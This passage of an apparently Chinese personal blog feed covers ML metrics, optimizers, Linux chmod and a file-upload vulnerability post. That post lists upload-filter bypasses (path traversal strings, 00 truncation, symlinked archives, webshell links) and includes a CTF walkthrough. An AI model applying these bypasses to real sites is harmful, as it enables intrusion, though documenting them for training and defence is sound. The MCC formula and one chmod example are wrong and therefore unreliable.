P-R曲线区别</strong></p><ul><li>ROC曲线能够尽量降低不同测试集带来的干扰，更加客观地衡量模型本身的性能。</li><li>若选择不同的测试集，P-R曲线的变化就会非常大，而ROC曲线则 能够更加稳定地反映模型本身的好坏。ROC曲线的适用场景更多，被广泛 用于排序、推荐、广告等领域。</li><li>如果研究者希望更多地看到模型在特定数据集上的表现，P-R曲线则能够更直观地反映其性能。</li></ul></li><li><p>MSE 均方误差 (Mean Squared Error )</p><ul><li><img src="https://img.dyngq.top/images/20210212014709.png" alt="image-20210212014707594" style="zoom: 50%;"></li></ul></li><li><p><strong>RMSE</strong> 平方根误差</p><ul><li><img src="https://img.dyngq.top/images/20210212014305.png" alt="image-20210212014303169"></li><li>容易受<strong>离群点</strong>(Outlier)影响</li><li>离群点要么过滤，要么加入建模(复杂)，要么使用其他误差评估指标，比如<strong>MAPE</strong></li></ul></li><li><p>MAE (Mean Absolute Error) 平均绝对误差是绝对误差的平均值 </p><ul><li><img src="https://img.dyngq.top/images/20210212014819.png" alt="image-20210212014756491" style="zoom:50%;"></li></ul></li><li><p><strong>MAPE</strong></p><ul><li><img src="https://img.dyngq.top/images/20210212014928.png" alt="image-20210212014927383"></li></ul></li><li><p>标准差 SD </p></li><li><p>马修斯相关系数 —- <strong>MCC</strong></p><ul><li><script type="math/tex; mode=display">MCC = \frac{TP*TN-TP*FN}{\sqrt{(TP+FP)*(TP+FN)*(TN+FP)*(TN+FN)} }</script></li><li><p>“马修斯相关系数 —- MCC 主要用于衡量二分类问题，其综合考虑了 TP TN, FP , FN， 是一个比较均衡的指标， 对于样本不均衡情况下也可以使用。MCC的取值范围在 <strong>[-1, 1]</strong>， 取值为1 表示预测与实际完全一致， 取值为0表示预测的结果还不如随机预测的结果， -1 表示预测结果与实际的结果完全不一致。因此我们看到， MCC 本质上描述了预测结果与实际结果之间的相关系数。”</p></li></ul></li></ul><h2 id="0x02-模型评估方法"><a href="#0x02-模型评估方法" class="headerlink" title="0x02 模型评估方法"></a>0x02 模型评估方法</h2><ul><li>Holdout检验<ul><li>正常划分 训练集验证集</li></ul></li><li>交叉检验<ul><li>k-fold交叉验证</li><li>留一验证（留P验证）<ul><li>必须进行$C^{P}_{N}$次训练和验证</li></ul></li></ul></li><li>自助法<ul><li>又放回抽取N次抽取</li><li>当N趋近去无穷大时，未被抽取的概率：<ul><li>某一个样本N次都未被抽取的改率<ul><li>$(1-\frac{1}{n})^{n}$</li><li>根据重要极限$\lim_{x \to \infty} (1+\frac{1}{n})^{n} = e$</li><li>最终结果等于$\frac{1}{e}$，约等于0.368</li></ul></li></ul></li></ul></li></ul><h2 id="0x03-过拟合-欠拟合"><a href="#0x03-过拟合-欠拟合" class="headerlink" title="0x03 过拟合 欠拟合"></a>0x03 过拟合 欠拟合</h2><p>统计学习方法里说过，模型能够学习的必要条件，就是存在绝对误差下届，也是拟合的前提。</p><p><img src="D:\Pictures\markdown.img\image-20210212211226486.png" alt="image-20210212211226486"></p><p>解决<strong>过拟合</strong></p><ol><li>更多数据（保证质量）</li><li>降低模型复杂度，减少参数</li><li>正则化</li><li>集成学习</li></ol><p>解决欠拟合</p><ol><li><ol><li><ol><li>的反方法。</li></ol></li></ol></li></ol><h2 id="0x04-其他问题"><a href="#0x04-其他问题" class="headerlink" title="0x04 其他问题"></a>0x04 其他问题</h2><h3 id="4-1-调参方法"><a href="#4-1-调参方法" class="headerlink" title="4-1 调参方法"></a>4-1 调参方法</h3><ul><li>网格搜索<ul><li>全局搜索，可以调整步长跳跃尝试，但目标函数通常非凸，容易跳过最优点</li></ul></li><li>随机搜索</li><li>贝叶斯优化<ul><li>会根据先验分布假设搜集函数，根据后验分布，给出最优值可能的点</li><li>容易陷入局部最优，会尝试新区域继续探索或者该区域继续利用</li></ul></li><li>Google Vizier</li><li>ACCESS审稿过一篇文章说过一种调参方法<ul><li>The <strong>Slap</strong> Swarm Algorithm (SSA) is a heuristic algorithm that simulates the foraging of <strong>slaps</strong> in the biological world [28]. “ There should be “salp” instead of “slap”.</li></ul></li><li>AutoML/DL</li></ul><h3 id="4-2-余弦相似度"><a href="#4-2-余弦相似度" class="headerlink" title="4-2 余弦相似度"></a>4-2 余弦相似度</h3><ul><li>余弦相似度 <ul><li><img src="D:\Pictures\markdown.img\image-20210212213555296.png" alt="image-20210212213555296"></li></ul></li><li>余弦距离<ul><li><img src="D:\Pictures\markdown.img\image-20210212213607844.png" alt="image-20210212213607844"></li></ul></li></ul><h3 id="4-3-A-B测试"><a href="#4-3-A-B测试" class="headerlink" title="4-3 A/B测试"></a>4-3 A/B测试</h3><p><strong>独立</strong> 互不影响</p><p><strong>无偏</strong> 随机抽取</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/97870600" target="_blank" rel="noopener">精确率，召回率，F1值的通俗解释</a></li><li>《百面机器学习》</li><li>《统计学习方法》</li><li><a href="https://blog.csdn.net/qq_31821675/article/details/82025527" target="_blank" rel="noopener">【机器学习】均方误差(MSE)和均方根误差(RMSE)和平均绝对误差(MAE)</a></li><li><a href="https://zhuanlan.zhihu.com/p/73558315" target="_blank" rel="noopener">python实现混淆矩阵</a></li></ul><p><strong>附图：</strong> <span id="addimg"> </span></p><p><img src="https://img.dyngq.top/images/20210211010031.png" alt="roc&auc" style="zoom:15%;"><img src="https://img.dyngq.top/images/20210211010046.png" alt="Precision-Recall" style="zoom:15%;"></p><p><strong>附录：</strong> <span id="addword"> </span></p><p>​        ROC曲线最早是运用在军事上的，后来逐渐运用到医学领域，并于20世纪80年代后期被引入机器学习领域。相传在第二次 世界大战期间，雷达兵的任务之一就是死死地盯住雷达显示器，观察是否有敌机来袭。理论上讲，只要有敌机来袭，雷达屏幕上 就会出现相应的信号。但是实际上，如果飞鸟出现在雷达扫描区域时，雷达屏幕上有时也会出现信号。这种情况令雷达兵烦恼不 已，如果过于谨慎，凡是有信号就确定为敌机来袭，显然会增加误报风险；如果过于大胆，凡是信号都认为是飞鸟，又会增加漏 报的风险。每个雷达兵都竭尽所能地研究飞鸟信号和飞机信号之间的区别，以便增加预报的准确性。但问题在于，每个雷达兵都 有自己的判别标准，有的雷达兵比较谨慎，容易出现误报；有的雷达兵则比较胆大，容易出现漏报。 为了研究每个雷达兵预报的准确性，雷达兵的管理者汇总了所有雷达兵的预报特点，特别是他们漏报和误报的概率，并将 这些概率画到一个二维坐标系里。这个二维坐标的纵坐标为敏感性（真阳性率），即在所有敌机来袭的事件中，每个雷达兵准确 预报的概率。而横坐标则为1-特异性（假阳性率），表示在所有非敌机来袭信号中，雷达兵预报错误的概率。由于每个雷达兵的 预报标准不同，且得到的敏感性和特异性的组合也不同。将这些雷达兵的预报性能进行汇总后，雷达兵管理员发现他们刚好在一 条曲线上，这条曲线就是后来被广泛应用在医疗和机器学习领域的ROC曲线。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;常用的模型评价指标以及他们的一些问题&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>不讲道理的BERT</title>
    <link href="http://www.dyngq.top/2020/07/07/20200707-%E4%B8%8D%E8%AE%B2%E9%81%93%E7%90%86%E7%9A%84BERT/"/>
    <id>http://www.dyngq.top/2020/07/07/20200707-不讲道理的BERT/</id>
    <published>2020-07-06T16:00:01.000Z</published>
    <updated>2022-06-20T11:44:21.556Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>不管三七二十一直接上BERT的BERT；</p></blockquote><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;不管三七二十一直接上BERT的BERT；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="NLP" scheme="http://www.dyngq.top/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>优化方法，激活函数</title>
    <link href="http://www.dyngq.top/2020/06/18/20200618-%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95%EF%BC%8C%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"/>
    <id>http://www.dyngq.top/2020/06/18/20200618-优化方法，激活函数/</id>
    <published>2020-06-18T00:40:00.000Z</published>
    <updated>2022-06-20T11:44:21.556Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>总结机器学习常用的优化方法；</p><p>总结深度学习常用的激活函数；</p></blockquote><a id="more"></a><h2 id="0x01-无约束优化方法"><a href="#0x01-无约束优化方法" class="headerlink" title="0x01 无约束优化方法"></a>0x01 无约束优化方法</h2><p>直接法和迭代法；</p><p>迭代法主要有，一阶的梯度下降法，二阶的牛顿法</p><h3 id="1-1-梯度下降-一阶泰勒展开"><a href="#1-1-梯度下降-一阶泰勒展开" class="headerlink" title="1-1 梯度下降 一阶泰勒展开"></a>1-1 梯度下降 一阶泰勒展开</h3><h3 id="1-2-牛顿法-二阶泰勒展开"><a href="#1-2-牛顿法-二阶泰勒展开" class="headerlink" title="1-2 牛顿法 二阶泰勒展开"></a>1-2 牛顿法 二阶泰勒展开</h3><p>对于二次函数（或在局部是二次的函数），Hessian矩阵H正定，那么H^{-1}可计算，牛顿法会使参数直接跳到极小值点。对于非二次的函数，只要Hessian矩阵在当前保持正定，牛顿法依然适用，可以迭代地更新下去。</p><p><strong>相比起一阶方法，牛顿法能够充分利用二阶微分的信息，减少迭代的次数，缩短训练时间。</strong></p><p>最优化问题中，牛顿法为什么比梯度下降法求解需要的迭代次数更少？</p><p>​    牛顿法是二阶收敛，梯度下降是一阶收敛，所以牛顿法就更快。如果更通俗地说的话，比如你想找一条最短的路径走到一个盆地的最底部，梯度下降法每次只从你当前所处位置选一个坡度最大的方向走一步，牛顿法在选择方向时，不仅会考虑坡度是否够大，还会考虑你走了一步之后，坡度是否会变得更大。所以，可以说牛顿法比梯度下降法看得更远一点，能更快地走到最底部。</p><p>​    根据wiki上的解释，从几何上说，牛顿法就是用一个二次曲面去拟合你当前所处位置的局部曲面，而梯度下降法是用一个平面去拟合当前的局部曲面，通常情况下，二次曲面的拟合会比平面更好，所以牛顿法选择的下降路径会更符合真实的最优下降路径。</p><p><img src="https://img.dyngq.top/images/20210315215425.png" alt="image-20210315215419874" style="zoom: 67%;"></p><p>但它有以下<strong>缺陷</strong>：</p><ol><li>牛顿法需要计算矩阵的逆。一个$k\times k$的矩阵的求逆运算的复杂度是$(k^3)$，这将大大增加计算的负担。</li><li>牛顿法在局部二次曲面上会直接求得极小值点，而极小值点的梯度为零。这就使得模型陷入了局部最优，无法通过梯度更新逃离局部最优解。</li><li>牛顿法只适用于Hessian矩阵正定的情况。在高维空间中，这一点不一定成立。例如，在鞍点附近，Hessian矩阵同时具有正负特征值。牛顿法将会得到错误的方向。</li><li>最严重的问题是，牛顿法会被吸引到<strong>鞍点</strong>。但高维参数空间中，鞍点比局部极值普遍。梯度下降法会沿着梯度的反方向前进，如果梯度反方向没有鞍点，那么它不会主动去找鞍点。所以梯度下降能够逃离鞍点，但牛顿法不能。牛顿法旨在寻找梯度为零的点，它会主动找到鞍点，并锁死在那里（因为鞍点的梯度为零）。</li></ol><h3 id="1-3-拟牛顿法"><a href="#1-3-拟牛顿法" class="headerlink" title="1-3 拟牛顿法"></a>1-3 拟牛顿法</h3><p><img src="https://img.dyngq.top/images/20210315215517.png" alt="image-20210315215515144"></p><h2 id="0x02-常用优化方法"><a href="#0x02-常用优化方法" class="headerlink" title="0x02 常用优化方法"></a>0x02 常用优化方法</h2><h3 id="2-1-SGD-mini-batch-gradient-descent"><a href="#2-1-SGD-mini-batch-gradient-descent" class="headerlink" title="2-1 SGD (mini-batch gradient descent)"></a>2-1 SGD (mini-batch gradient descent)</h3><p>小批量梯度下降，一次只取一小批；不需要像批梯度下降一样遍历全部，节省了计算；也不像随机梯度下降一样只取一次，降低了方差。</p><h3 id="2-2-Momentum-动量"><a href="#2-2-Momentum-动量" class="headerlink" title="2-2 Momentum 动量"></a>2-2 Momentum 动量</h3><p>相当于给了一种加速度。</p><p>当前时刻的决定，与之前时刻的运动方向相关。在某方向上，若是与之前方向不同，则抑制；若是相同，则更快。</p><p><img src="https://img.dyngq.top/images/20210321183746.png" alt="image-20210321183744459" style="zoom: 33%;"></p><h3 id="2-3-Adagrad-环境感知"><a href="#2-3-Adagrad-环境感知" class="headerlink" title="2-3 Adagrad 环境感知"></a>2-3 Adagrad 环境感知</h3><p>对于频繁更新的参数，降低学习率；对于很少更新的参数，提高学习率</p><p>分母具有退火作用，随着迭代，分母越来越大，学习率越来越小</p><h3 id="2-4-Adam-融合2-2-amp-2-3"><a href="#2-4-Adam-融合2-2-amp-2-3" class="headerlink" title="2-4 Adam 融合2-2&amp;2-3"></a>2-4 Adam 融合2-2&amp;2-3</h3><p>一阶矩</p><p>二阶矩</p><h3 id="2-5-Adadelta"><a href="#2-5-Adadelta" class="headerlink" title="2-5 Adadelta"></a>2-5 Adadelta</h3><p>Adagrad会累加之前所有的梯度平方，而Adadelta只累加固定大小的项，并且也不直接存储这些项，仅仅是近似计算对应的平均值。</p><h3 id="2-6-RMSprop"><a href="#2-6-RMSprop" class="headerlink" title="2-6 RMSprop"></a>2-6 RMSprop</h3><p>RMSprop可以算作Adadelta的一个特例</p><p>RMSprop算是Adagrad的一种发展，和Adadelta的变体，效果趋于二者之间</p><p>适合处理非平稳目标 - 对于<strong>RNN</strong>效果很好</p><h3 id="2-7-Nesterov-提前量"><a href="#2-7-Nesterov-提前量" class="headerlink" title="2-7 Nesterov 提前量"></a>2-7 Nesterov 提前量</h3><p>根据当前动量多走一步，根据下一步，调整当前步。</p><p>​    举个通俗的例子就是，你在下坡时，如果在下坡快到底，但又未到底时，动量梯度下降会让你冲到坡的对面去。Nesterov梯度下降会预知你的下一步将会时到坡的对面去，所以会提示你提前刹车，避免过度冲到坡的对面去。这包含了一种提前计算下一步的梯度，来指导当前梯度的想法。</p><h3 id="2-8-Nadam"><a href="#2-8-Nadam" class="headerlink" title="2-8 Nadam"></a>2-8 Nadam</h3><h3 id="2-9-Adamax"><a href="#2-9-Adamax" class="headerlink" title="2-9 Adamax"></a>2-9 Adamax</h3><h2 id="0x03-激活函数"><a href="#0x03-激活函数" class="headerlink" title="0x03 激活函数"></a>0x03 激活函数</h2><p>最欣赏的解释：</p><p><img src="https://img.dyngq.top/images/20210321180800.png" alt="image-20210321180759351"></p><p>其他的贴上之前的简单整理</p><p><img src="https://img.dyngq.top/images/20210321180926.png" alt="image-20210321180925758"></p><p><img src="https://img.dyngq.top/images/20210321180941.png" alt="image-20210321180939945"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://zhuanlan.zhihu.com/p/22252270" target="_blank" rel="noopener">深度学习最全优化方法总结比较（SGD，Adagrad，Adadelta，Adam，Adamax，Nadam）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;总结机器学习常用的优化方法；&lt;/p&gt;
&lt;p&gt;总结深度学习常用的激活函数；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析 - malware analysis</title>
    <link href="http://www.dyngq.top/2020/06/01/20200601-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.dyngq.top/2020/06/01/20200601-恶意代码分析/</id>
    <published>2020-06-01T00:40:00.000Z</published>
    <updated>2022-06-20T11:44:21.555Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>恶意代码分析与检测</p></blockquote><a id="more"></a><h2 id="0x00-PE文件结构"><a href="#0x00-PE文件结构" class="headerlink" title="0x00 PE文件结构"></a>0x00 PE文件结构</h2><h2 id="0x01-静态分析"><a href="#0x01-静态分析" class="headerlink" title="0x01 静态分析"></a>0x01 静态分析</h2><h3 id="1-常用工具"><a href="#1-常用工具" class="headerlink" title="1. 常用工具"></a>1. 常用工具</h3><ul><li>SdutyPE </li><li>PEID</li><li>PEView</li><li>IDA Pro</li></ul><h3 id="2-动态链接库"><a href="#2-动态链接库" class="headerlink" title="2. 动态链接库"></a>2. 动态链接库</h3><p>注意一些常用的动态链接库，比如</p><ul><li><em>ws2_32</em>.<em>dll</em>是Windows Sockets应用程序接口， 用于支持Internet和网络应用程序。</li></ul><h2 id="0x02-动态分析"><a href="#0x02-动态分析" class="headerlink" title="0x02 动态分析"></a>0x02 动态分析</h2>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;恶意代码分析与检测&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="Reverse" scheme="http://www.dyngq.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>从CNN，VGG，Inception，ResNet，到EfficientNet</title>
    <link href="http://www.dyngq.top/2020/05/20/20200520-%E4%BB%8ECNN%EF%BC%8Cvgg%EF%BC%8Cinception%EF%BC%8Cresnet%EF%BC%8C%E5%88%B0EfficientNet/"/>
    <id>http://www.dyngq.top/2020/05/20/20200520-从CNN，vgg，inception，resnet，到EfficientNet/</id>
    <published>2020-05-19T16:00:01.000Z</published>
    <updated>2022-06-20T11:44:21.554Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CNN类模型的发展与总结；</p></blockquote><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;CNN类模型的发展与总结；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="CNN" scheme="http://www.dyngq.top/tags/CNN/"/>
    
  </entry>
  
  <entry>
    <title>大数据相关整理</title>
    <link href="http://www.dyngq.top/2020/05/13/20200513-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/"/>
    <id>http://www.dyngq.top/2020/05/13/20200513-大数据相关整理/</id>
    <published>2020-05-13T12:00:00.000Z</published>
    <updated>2022-06-20T11:44:21.554Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>大数据和人工智能是分不开的；</p><p>总结相关mapreduce技术等；</p></blockquote><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;大数据和人工智能是分不开的；&lt;/p&gt;
&lt;p&gt;总结相关mapreduce技术等；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="BigData" scheme="http://www.dyngq.top/tags/BigData/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://www.dyngq.top/2020/05/10/20200510-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.dyngq.top/2020/05/10/20200510-文件上传漏洞/</id>
    <published>2020-05-10T05:23:00.000Z</published>
    <updated>2022-06-20T11:44:21.553Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>简单总结一下文件上传漏洞的一些绕过姿势与防御；</p></blockquote><a id="more"></a><p>题库：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><p>综述：<a href="https://zhuanlan.zhihu.com/p/259985000" target="_blank" rel="noopener">Webshell研究综述-阿里云能力建设团队</a></p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>存在条件</p><ol><li>存在上传点</li><li>可以上传动态文件</li><li>上传目录有执行权限，并且上传的文件可执行</li><li>可访问到上传的动态文件</li></ol><p><img src="https://img.dyngq.top/images/20210304222038.png" alt="image-20210304222036807"></p><h2 id="0x01-基本姿势"><a href="#0x01-基本姿势" class="headerlink" title="0x01 基本姿势"></a>0x01 基本姿势</h2><ul><li>基本的服务端检测包括MIME检测等，此类可以通过抓包修改等简单绕过</li><li>内容过滤，可以考虑copy命令合并图片和脚本</li><li>强混淆<ul><li><a href="https://github.com/sunge/Weevely" target="_blank" rel="noopener">https://github.com/sunge/Weevely</a></li></ul></li><li>Webshell收集项目<ul><li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></li></ul></li><li>多个filename</li><li>目录穿越             ../../../         .././.././../ (./是为了防止../../被过滤)</li><li>解析漏洞 首先根据指纹确定中间件的版本<ul><li>确定是否存在00阶段类型的漏洞</li></ul></li></ul><h2 id="0x02-高级姿势"><a href="#0x02-高级姿势" class="headerlink" title="0x02 高级姿势"></a>0x02 高级姿势</h2><ol><li>重绘图<ul><li>找到不被转换的部分</li><li><a href="https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE" target="_blank" rel="noopener">https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</a></li></ul></li><li>文件包含与PHPINFO<ul><li><a href="https://github.com/hxer/vulnapp.git" target="_blank" rel="noopener">https://github.com/hxer/vulnapp.git</a></li></ul></li><li>在线解压缩漏洞<ul><li>webshell解压到网站目录（可使用../目录穿越）</li><li>文件软链接的方式，将根目录等敏感目录软连接到自己的文件，之后将软链接压缩上传</li><li><img src="https://img.dyngq.top/images/20210304221530.png" alt="image-20210304221528581"></li></ul></li></ol><h2 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03 防御"></a>0x03 防御</h2><p><img src="https://img.dyngq.top/images/20210304222619.png" alt="image-20210304222127470"></p><h2 id="0x04-一些CTF题目"><a href="#0x04-一些CTF题目" class="headerlink" title="0x04 一些CTF题目"></a>0x04 一些CTF题目</h2><h3 id="4-1-weekly-ctf-07-00截断"><a href="#4-1-weekly-ctf-07-00截断" class="headerlink" title="4-1 weekly-ctf-07 00截断"></a>4-1 weekly-ctf-07 00截断</h3><p>首先，这个问题的难点在于不只是后缀验证一次，</p><ol><li>上传的时候必须是jpg png gif，就是下图的灰色箭头；content-type倒是不重要</li><li>红色箭头的路径会和你的文件名进行一次拼接，拼接之后再进行一次检测，这次要求你必须是php后缀</li><li>所以解决办法只能是让地址生效，拼接后后面的地方失效</li></ol><p>这个题的重点在于这个文件路径是可控的</p><p><img src="https://img.dyngq.top/images/20210304222612.png" alt="image-20200515221430265" style="zoom:50%;"></p><p>那关键点就在这儿了，如何操作让a.php后边拼接部分失效呢，最简单的就是最流行的00截断法，这个要在16进制界面更改，下图2</p><p><img src="https://img.dyngq.top/images/20210304222607.png" alt="image-20200515221950885" style="zoom:50%;"></p><p><img src="https://img.dyngq.top/images/20210304222602.png" alt="image-20200515222415720" style="zoom:50%;"></p><p>这一行的0d 0a是什么意思呢</p><p><img src="D:\Pictures\markdown.img\image-20200515222358315.png" alt="image-20200515222358315"></p><p>所以要留空，留一个字符，可以是空格等</p><p><img src="https://img.dyngq.top/images/20210304222557.png" alt="image-20200515222654609" style="zoom:50%;"></p><p><img src="https://img.dyngq.top/images/20210304222553.png" alt="image-20200515222714987" style="zoom:50%;"></p><p>只需要把留空的字符改为00，forward一下就可以出flag了</p><p><img src="https://img.dyngq.top/images/20210304222544.png" alt="image-20200515222811594" style="zoom: 50%;"></p><h3 id="4-2-任意上传-JS形式一句话-菜刀使用"><a href="#4-2-任意上传-JS形式一句话-菜刀使用" class="headerlink" title="4-2 任意上传 JS形式一句话 菜刀使用"></a>4-2 任意上传 JS形式一句话 菜刀使用</h3><p><img src="https://img.dyngq.top/images/20210304222736.png" alt="image-20200525192531360" style="zoom: 80%;"></p><p><img src="https://img.dyngq.top/images/20210304222746.png" alt="image-20200525193041272"></p><p><img src="https://img.dyngq.top/images/20210304222748.png" alt="image-20200525193156651"></p><p><img src="https://img.dyngq.top/images/20210304222750.png" alt="image-20200525192402433"></p><p><img src="https://img.dyngq.top/images/20210304222753.png" alt="image-20200525193030249"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/259985000" target="_blank" rel="noopener">Webshell研究综述-阿里云能力建设团队</a></li><li><a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408" target="_blank" rel="noopener">关于00截断原理的一些思考</a></li><li><a href="https://xz.aliyun.com/t/3937" target="_blank" rel="noopener">利用htaccess绕黑名单，mail绕过disable function</a></li><li><a href="https://xz.aliyun.com/t/1189/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></li><li><a href="https://blog.51cto.com/0x007/1694928" target="_blank" rel="noopener">文件上传之黑名单验证绕过</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;简单总结一下文件上传漏洞的一些绕过姿势与防御；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="Sec" scheme="http://www.dyngq.top/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>Linux 权限简析</title>
    <link href="http://www.dyngq.top/2020/04/08/20200408-Linux-%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/"/>
    <id>http://www.dyngq.top/2020/04/08/20200408-Linux-权限总结/</id>
    <published>2020-04-08T13:26:04.000Z</published>
    <updated>2022-06-20T11:44:21.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p><img src="https://img.dyngq.top/images/20201108212435.jpg" alt="img" style="zoom:33%;"></p><ul><li>加权限 chmod u+rwx,g+rwx,o+rwx file</li><li>减权限 chmod u+rwx,g+rwx,o+rwx file</li></ul><a id="more"></a><ul><li>a代表u+g+o，chmod a+rwx file</li><li>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</li><li>其他参数<ul><li>-c : 若该文件权限确实已经更改，才显示其更改动作</li><li>-f : 若该文件权限无法被更改也不要显示错误讯息</li><li>-v : 显示权限变更的详细资料</li><li>-R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递归的方式逐个变更)</li><li>—help : 显示辅助说明</li><li>—version : 显示版本</li></ul></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">ALL</th><th style="text-align:center">文件所有者</th><th style="text-align:center">用户组</th><th style="text-align:center">其它用户</th></tr></thead><tbody><tr><td style="text-align:center">a</td><td style="text-align:center">u</td><td style="text-align:center">g</td><td style="text-align:center">o</td></tr><tr><td style="text-align:center">all</td><td style="text-align:center">user</td><td style="text-align:center">group</td><td style="text-align:center">other</td></tr></tbody></table></div><h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><div class="table-container"><table><thead><tr><th>rwx</th><th>读写执行</th><th>…</th></tr></thead><tbody><tr><td>X</td><td>特殊执行权限</td><td>只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td></tr><tr><td>s</td><td>setuid/gid</td><td>当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</td></tr><tr><td>t</td><td>粘贴位</td><td>设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td></tr></tbody></table></div><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><blockquote><p>ls -la</p></blockquote><ul><li><img src="https://img.dyngq.top/images/20201108212443.png" alt="image-20201106173459491"></li><li>第一位 d 代表文件夹</li><li>./ 代表当前目录</li><li>../代表父目录</li></ul><h2 id="八进制-快捷表示"><a href="#八进制-快捷表示" class="headerlink" title="八进制 快捷表示"></a>八进制 快捷表示</h2><blockquote><p>根据 3位 二进制 来一一对应</p></blockquote><div class="table-container"><table><thead><tr><th style="text-align:center">#</th><th style="text-align:center">权限</th><th style="text-align:center">rwx</th><th style="text-align:center">二进制</th></tr></thead><tbody><tr><td style="text-align:center">7</td><td style="text-align:center">读 + 写 + 执行</td><td style="text-align:center">rwx</td><td style="text-align:center">111</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">读 + 写</td><td style="text-align:center">rw-</td><td style="text-align:center">110</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">读 + 执行</td><td style="text-align:center">r-x</td><td style="text-align:center">101</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">只读</td><td style="text-align:center">r—</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">写 + 执行</td><td style="text-align:center">-wx</td><td style="text-align:center">011</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">只写</td><td style="text-align:center">-w-</td><td style="text-align:center">010</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">只执行</td><td style="text-align:center">—x</td><td style="text-align:center">001</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">无</td><td style="text-align:center">—-</td><td style="text-align:center">000</td></tr></tbody></table></div><ul><li>777 : rwxrwxrwx : ugo (a)</li><li>755 : rwx </li></ul><h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><ul><li><img src="https://img.dyngq.top/images/20201108212448.png" alt="image-20201106170017841"></li><li><img src="https://img.dyngq.top/images/20201108212450.png" alt="image-20201106170130163"></li><li><img src="https://img.dyngq.top/images/20201108212452.png" alt="image-20201106170143787"></li><li><img src="https://img.dyngq.top/images/20201108212459.png" alt="image-20201106170349767"></li></ul><h2 id="参考链接"><a 